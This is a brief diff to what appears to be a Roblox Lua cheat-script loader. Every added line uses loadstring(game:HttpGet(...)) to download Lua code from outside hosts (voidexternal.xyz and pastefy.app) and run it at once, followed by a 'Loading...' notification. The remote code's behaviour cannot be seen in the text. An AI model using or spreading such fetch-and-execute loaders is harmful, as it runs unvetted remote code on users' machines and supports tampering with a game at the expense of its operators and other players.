@@ -1,5 +1,5 @@
-loadstring(game:HttpGet("https://pastefy.app/IiGilbhX/raw"))()
-
+loadstring(game:HttpGet("https://voidexternal.xyz/api/fjwwe74m.lua"))()
+loadstring(game:HttpGet("https://pastefy.app/0RyD0N0t/raw"))()
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "WARNING",
     Text = "Loading... Script is not fully loaded until this message is gone",
